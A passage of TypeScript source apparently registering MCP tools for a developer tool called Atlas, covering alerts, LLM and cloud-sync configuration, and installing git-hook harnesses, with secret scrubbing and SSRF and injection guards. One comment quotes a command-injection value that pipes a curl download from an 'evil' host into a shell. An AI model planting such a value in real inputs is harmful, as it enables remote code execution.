            // The `schema-file:<path>` tag stays for discoverability, but Lore
            // Tags Pass 3 caps each tag at 64 chars — a long path is silently
            // truncated, so filtering decisions by schemaFile would miss it.
            // Keep the FULL, untruncated path in metadata as the source of truth.
            const tags = `schema,migration,atlas,schema-file:${args.schemaFile as string}`;
            const metadata = JSON.stringify({ schemaFile: args.schemaFile as string });
            // SECURITY — same write-path scrub as knowledge_store. A schema
            // rationale is agent/human free text and lands in the same git-synced
            // memory file, so it gets the same treatment. See security/secretScrub.ts.
            const sc = scrubKnowledgeFields({ label: args.label as string, content, tags, metadata });
            // Embedded: write the decision node in-process WITH embed:true so it
            // is recalled by semantic similarity (mirrors knowledge_store).
            if (cfg.lore.mode === 'embedded') {
                try {
                    return await withEmbeddedLore(cfg, workspace, async (lore) => {
                        const id = `knowledge:decision:${Date.now()}-${Math.floor(Math.random() * 1e6)}`;
                        await lore.storeNode({
                            id,
                            type: 'decision',
                            workspace,
                            embed: true,
                            label: sc.node.label as string,
                            content: sc.node.content as string,
                            tags: sc.node.tags,
                            metadata: sc.node.metadata,
                        });
                        await lore.awaitEmbeds();
                        return { ok: true, id, embedded: true };
                    });
                } catch (err) {
                    return sanitizedToolError('schema_confirm failed', err);
                }
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            return storeKnowledgeNode(lc.mcpUrl, lc.token, {
                type: 'decision',
                label: sc.node.label as string,
                content: sc.node.content as string,
                tags: sc.node.tags,
                metadata: sc.node.metadata,
                workspace,
            });
        },
    });

    // ── Sprint 3: Alert Tools ─────────────────────────────────────────────────

    registry.register({
        name: 'alerts_get',
        description: 'Gather structured alerts from Atlas analytics: dead code, hotspots, and optionally schema drift. Results are merged into a ranked alerts array with type, severity, summary, and detail. Use to get a single prioritized view of what needs attention in a workspace.',
        inputSchema: {
            type: 'object',
            // workspace is OPTIONAL here (unlike the write tools): a read can't
            // misfile data, and the handler already defaults to the config
            // workspace. Requiring it made the most likely first call an agent
            // makes ("what needs attention?") hard-fail for no benefit.
            properties: {
                workspace: { type: 'string', description: 'Lore workspace to scan; defaults to Atlas config.' },
                repoRoot: { type: 'string', description: 'Repo root for hotspot churn analysis.' },
                schemaFile: { type: 'string', description: 'If provided, schema drift is included in the alerts.' },
                limit: { type: 'integer', description: 'Max alerts per category (default 10).' },
            },
        },
        handler: async (args) => {
            const __r = resolveCodeReader();
            if ('error' in __r) return __r.error;
            const reader = __r.reader;
            const workspace = (args.workspace as string | undefined) ?? __r.workspace;
            const limit = (args.limit as number | undefined) ?? 10;

            const tasks: Promise<unknown>[] = [
                runFindDeadCode(reader, { limit, workspace }, workspace),
                runHotspots(reader, { limit, repoRoot: args.repoRoot as string | undefined, workspace }, workspace),
            ];
            if (args.schemaFile) {
                tasks.push(runSchemaDriftTool(reader, {
                    schemaFile: args.schemaFile as string,
                    repoRoot: args.repoRoot as string | undefined,
                    workspace,
                }));
            }

            const results = await Promise.allSettled(tasks);
            const alerts: Array<{
                type: 'dead_code' | 'hotspot' | 'schema_drift' | 'layer_violation';
                severity: 'high' | 'medium' | 'low';
                summary: string;
                detail: unknown;
            }> = [];

            // Dead code alerts.
            if (results[0]?.status === 'fulfilled') {
                const dc = results[0].value as { candidates?: Array<{ name: string; file: string; kind: string }> };
                for (const c of (dc.candidates ?? []).slice(0, limit)) {
                    alerts.push({
                        type: 'dead_code',
                        severity: 'medium',
                        summary: `Dead ${c.kind}: ${c.name} in ${c.file}`,
                        detail: c,
                    });
                }
            }

            // Hotspot alerts.
            if (results[1]?.status === 'fulfilled') {
                const hs = results[1].value as { entries?: Array<{ name: string; file: string; kind: string; score: number; complexity: number }> };
                for (const e of (hs.entries ?? []).slice(0, limit)) {
                    const severity: 'high' | 'medium' | 'low' = e.score > 10 ? 'high' : e.score > 5 ? 'medium' : 'low';
                    alerts.push({
                        type: 'hotspot',
                        severity,
                        summary: `High-complexity ${e.kind}: ${e.name} (score ${e.score}, complexity ${e.complexity})`,
                        detail: e,
                    });
                }
            }

            // Schema drift alerts (optional, index 2).
            if (args.schemaFile && results[2]?.status === 'fulfilled') {
                const sd = results[2].value as { drifts?: Array<{ table: string; change: string }> };
                for (const d of (sd.drifts ?? []).slice(0, limit)) {
                    alerts.push({
                        type: 'schema_drift',
                        severity: 'high',
                        summary: `Schema drift on ${d.table}: ${d.change}`,
                        detail: d,
                    });
                }
            }

            // Sort: high first, then medium, then low.
            const sev: Record<string, number> = { high: 0, medium: 1, low: 2 };
            alerts.sort((a, b) => (sev[a.severity] ?? 2) - (sev[b.severity] ?? 2));

            return { workspace, alerts };
        },
    });

    registry.register({
        name: 'alerts_dismiss',
        description: 'Dismiss an alert by recording a decision node in Lore explaining why it was accepted or ignored. This creates an auditable trail so the same alert is not flagged again without context.',
        inputSchema: {
            type: 'object',
            required: ['alertType', 'summary', 'reason'],
            properties: {
                alertType: {
                    type: 'string',
                    enum: ['dead_code', 'hotspot', 'schema_drift', 'layer_violation'],
                    description: 'The type of alert being dismissed.',
                },
                summary: { type: 'string', description: 'The alert summary (copy from alerts_get output).' },
                reason: { type: 'string', description: 'Why this alert is acceptable or intentional.' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const alertType = args.alertType as string;
            const summary = args.summary as string;
            const reason = args.reason as string;
            // SECURITY — write-path scrub, same as knowledge_store. The dismissal
            // `reason` is free text typed by a human or an agent and is persisted
            // as a decision node, so it reaches .atlas/memory.jsonl and git.
            const scrubbed = scrubKnowledgeFields({
                label: `Alert dismissed: ${alertType} — ${summary.slice(0, 80)}`,
                content: `Alert type: ${alertType}\nAlert: ${summary}\n\nReason dismissed: ${reason}`,
                tags: `alert-dismissed,atlas,alert-type:${alertType}`,
            });
            const node = {
                type: 'decision' as const,
                label: scrubbed.node.label as string,
                content: scrubbed.node.content as string,
                tags: scrubbed.node.tags as string,
            };
            // Embedded mode (the default) has NO remote Lore daemon at
            // cfg.lore.mcpUrl — without this branch the tool always failed
            // with tokenMissingError in the primary deployment, while
            // alerts_get kept telling callers to use it. Store in-process,
            // same as knowledge_store's embedded branch.
            const cfg = loadConfig();
            if (cfg.lore.mode === 'embedded') {
                const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
                return withEmbeddedLore(cfg, workspace, async (lore) => {
                    const id = `knowledge:decision:${Date.now()}-${Math.floor(Math.random() * 1e6)}`;
                    await lore.storeNode({
                        id,
                        type: node.type,
                        workspace,
                        embed: true,
                        label: node.label,
                        content: node.content,
                        tags: node.tags,
                    } as never);
                    await lore.awaitEmbeds();
                    mirrorKnowledgeBackup(lore, workspace, cfg.home);
                    return { ok: true, id, embedded: true };
                });
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            const workspace = (args.workspace as string | undefined) ?? lc.workspace;
            return storeKnowledgeNode(lc.mcpUrl, lc.token, {
                ...node,
                workspace,
            });
        },
    });

    // ── Sprint 8: LLM Bridge Tools ───────────────────────────────────────────

    registry.register({
        name: 'llm_chat',
        description: 'Send a query to the configured LLM (Ollama, OpenAI, or Anthropic) with optional Atlas tool context. The LLM synthesises the context into a clear, actionable insight. Returns passthrough when provider=none.',
        inputSchema: {
            type: 'object',
            required: ['query'],
            properties: {
                query: { type: 'string', description: 'The developer\'s question or task.' },
                context: { type: 'string', description: 'Raw Atlas tool result (JSON string or plain text) to include as context for the LLM.' },
                toolLabel: { type: 'string', description: 'Human-readable name of the Atlas tool that produced the context (e.g. "knowledge_recall").' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            try {
                return await runLLMChat(cfg.llm, {
                    query: args.query as string,
                    context: args.context as string | undefined,
                    toolLabel: args.toolLabel as string | undefined,
                });
            } catch (err) {
                console.error(`[atlas] llm_chat failed: ${(err as Error)?.message ?? String(err)}`);
                return {
                    error: 'llm_chat failed',
                    detail: 'internal error',
                    provider: cfg.llm?.provider ?? 'none',
                    model: cfg.llm?.model ?? 'none',
                };
            }
        },
    });

    registry.register({
        name: 'llm_config_get',
        description: 'Return the current LLM configuration for the Atlas daemon. Shows provider and model; does NOT return the raw API key (only whether one is set).',
        inputSchema: {
            type: 'object',
            properties: {},
        },
        handler: async () => {
            const cfg = loadConfig();
            const llm = cfg.llm;
            if (!llm) {
                return { configured: false, provider: 'none', model: '', hasApiKey: false };
            }
            return {
                configured: true,
                provider: llm.provider,
                model: llm.model,
                hasApiKey: Boolean(llm.apiKey && llm.apiKey.length > 0),
                ollamaUrl: llm.ollamaUrl,
                allowCloudContext: llm.allowCloudContext === true,
            };
        },
    });

    // ── Sprint 12: Cloud Sync Provision ─────────────────────────────────────

    registry.register({
        name: 'cloud_sync_config_get',
        description: 'Return the current cloud sync configuration. Shows enabled status, sync direction, and cloud endpoint URL. Does NOT return the raw API key (only whether one is set).',
        inputSchema: {
            type: 'object',
            properties: {},
        },
        handler: async () => {
            const cfg = loadConfig();
            const cs = cfg.cloudSync;
            if (!cs) {
                return {
                    configured: false,
                    enabled: false,
                    cloudMcpUrl: '',
                    syncDirection: 'push',
                    hasApiKey: false,
                };
            }
            return {
                configured: true,
                enabled: cs.enabled,
                cloudMcpUrl: cs.cloudMcpUrl,
                syncDirection: cs.syncDirection,
                hasApiKey: Boolean(cs.apiKey && cs.apiKey.length > 0),
            };
        },
    });

    registry.register({
        name: 'cloud_sync_config_set',
        description: 'Persist cloud sync configuration to Atlas config.json. When enabled, Atlas can route Lore MCP calls to the cloud Groundfloor endpoint for multi-device and multi-user sync.',
        inputSchema: {
            type: 'object',
            required: ['enabled', 'cloudMcpUrl', 'syncDirection'],
            properties: {
                enabled: { type: 'boolean', description: 'Whether to enable cloud sync.' },
                cloudMcpUrl: { type: 'string', description: 'Cloud Lore MCP endpoint URL (e.g. https://api.groundfloor.io/lore/mcp).' },
                apiKey: { type: 'string', description: 'Cloud API key (Groundfloor account token).' },
                syncDirection: {
                    type: 'string',
                    enum: ['push', 'pull', 'bidirectional'],
                    description: 'push=local→cloud, pull=cloud→local merge, bidirectional=both.',
                },
            },
        },
        handler: async (args) => {
            // apiKey merge — same "leave blank to keep" contract as
            // llm_config_set: a blank/absent key preserves the persisted one
            // instead of silently wiping it.
            const argCloudKey = typeof args.apiKey === 'string' ? args.apiKey.trim() : '';
            const cloudSync: CloudSyncConfig = {
                enabled: Boolean(args.enabled),
                cloudMcpUrl: args.cloudMcpUrl as string,
                syncDirection: (args.syncDirection as CloudSyncConfig['syncDirection']) ?? 'push',
                apiKey: argCloudKey.length > 0 ? argCloudKey : loadConfig().cloudSync?.apiKey,
            };
            // #4 SSRF guard: a cloud target must be https and external.
            if (cloudSync.enabled) {
                const urlErr = cloudUrlError(cloudSync.cloudMcpUrl);
                if (urlErr) return { ok: false, error: `invalid_cloud_url: ${urlErr}` };
            }
            try {
                writeCloudSyncConfig(cloudSync);
                return {
                    ok: true,
                    saved: {
                        enabled: cloudSync.enabled,
                        cloudMcpUrl: cloudSync.cloudMcpUrl,
                        syncDirection: cloudSync.syncDirection,
                        hasApiKey: Boolean(cloudSync.apiKey && cloudSync.apiKey.length > 0),
                    },
                };
            } catch (err) {
                console.error(`[atlas] config write failed: ${(err as Error)?.message ?? String(err)}`);
                return { ok: false, error: 'internal error' };
            }
        },
    });

    registry.register({
        name: 'llm_config_set',
        description: 'Persist LLM provider configuration to Atlas config.json. Existing config fields (port, lore, sidecar) are preserved; only the llm section is updated.',
        inputSchema: {
            type: 'object',
            required: ['provider', 'model'],
            properties: {
                provider: {
                    type: 'string',
                    enum: ['ollama', 'openai', 'anthropic', 'none'],
                    description: 'LLM provider. Use "none" to disable LLM synthesis.',
                },
                model: { type: 'string', description: 'Model name (e.g. "llama3.2", "gpt-4o-mini", "claude-haiku-4-5").' },
                apiKey: { type: 'string', description: 'API key for OpenAI or Anthropic. Omit or leave empty for Ollama / none.' },
                ollamaUrl: { type: 'string', description: 'Base URL for local Ollama. Default: http://localhost:11434' },
                allowCloudContext: { type: 'boolean', description: 'Consent to send recalled repo/knowledge context to a CLOUD provider (OpenAI/Anthropic). Default false = context withheld. Sent context is always secret+PII-redacted regardless. Omit to leave the current setting unchanged.' },
            },
        },
        handler: async (args) => {
            // allowCloudContext is tri-state on purpose: an explicit boolean
            // sets it; OMITTED preserves whatever is persisted — otherwise every
            // unrelated provider/model save would silently revoke (or grant)
            // cloud-context consent.
            const prior = loadConfig().llm;
            // Same merge discipline for the API key: the UI promises "leave
            // blank to keep the saved key" — but writeLLMConfig REPLACES the
            // whole llm block and drops empty keys, so a blank save silently
            // wiped the credential and the next LLM call failed auth.
            const argKey = typeof args.apiKey === 'string' ? args.apiKey.trim() : '';
            const llm: LLMConfig = {
                provider: args.provider as LLMConfig['provider'],
                model: args.model as string,
                apiKey: argKey.length > 0 ? argKey : prior?.apiKey,
                ollamaUrl: args.ollamaUrl as string | undefined,
                allowCloudContext: typeof args.allowCloudContext === 'boolean'
                    ? args.allowCloudContext
                    : prior?.allowCloudContext === true,
            };
            // #4 SSRF guard: ollama must stay on the local machine.
            if (llm.ollamaUrl) {
                const urlErr = loopbackUrlError(llm.ollamaUrl);
                if (urlErr) return { ok: false, error: `invalid_ollama_url: ${urlErr}` };
            }
            try {
                writeLLMConfig(llm);
                return {
                    ok: true,
                    saved: {
                        provider: llm.provider,
                        model: llm.model,
                        hasApiKey: Boolean(llm.apiKey && llm.apiKey.length > 0),
                        ollamaUrl: llm.ollamaUrl,
                        allowCloudContext: llm.allowCloudContext === true,
                    },
                };
            } catch (err) {
                console.error(`[atlas] config write failed: ${(err as Error)?.message ?? String(err)}`);
                return { ok: false, error: 'internal error' };
            }
        },
    });

    registry.register({
        name: 'atlas_wire',
        description: 'Install the auto-consultation harness (Claude Code hooks + CLAUDE.md standing-instructions block + atlas-* skills + git knowledge-sync) into a project directory, so a coding agent is automatically consulted through Atlas instead of only being able to call it. Lets a UI (e.g. the onboarding flow) trigger the same wiring `atlas wire install` does from the CLI.',
        inputSchema: {
            type: 'object',
            required: ['project'],
            properties: {
                project: { type: 'string', description: 'Absolute path to the project directory to wire.' },
                workspace: { type: 'string', description: 'Lore workspace to bind the harness to. Defaults to the repo slug (or the folder name) when omitted.' },
            },
        },
        handler: async (args) => {
            const project = args.project as string;
            if (!project || typeof project !== 'string') return { error: 'missing_required_field: project' };
            // Not an arbitrary-write primitive: the path must exist, be a
            // directory, and (when an allowlist is configured) fall inside it —
            // same opt-in scan-path gate atlas_index/workspace_add_project use.
            if (!fs.existsSync(project)) return { error: `path does not exist: ${project}` };
            if (!fs.statSync(project).isDirectory()) return { error: `path is not a directory: ${project}` };
            const scanErr = scanPathError(project);
            if (scanErr) return { error: scanErr };
            // Defense in depth: reject a malicious `workspace` override at the tool
            // boundary too. `workspace` flows into /bin/sh git-hook scripts written
            // to .git/hooks/* at 0755 (gitHooks.ts) — an unsanitized value like
            // `x";curl http://evil|sh;"` is a command-injection → RCE on the next
            // commit/pull/checkout. installWire() also validates the FINAL effective
            // workspace (authoritative choke point); this is the first line.
            const wsOverride = args.workspace;
            if (wsOverride !== undefined) {
                if (typeof wsOverride !== 'string' || !/^[a-z0-9][a-z0-9-]*$/.test(wsOverride.trim())) {
                    return { error: `invalid workspace name: ${String(wsOverride)} — use lowercase letters, numbers, and hyphens only` };
                }
            }
            try {
                return await installWire(project, args.workspace as string | undefined);
            } catch (err) {
                return sanitizedToolError('atlas_wire failed', err);
            }
        },
    });

    return registry;
}
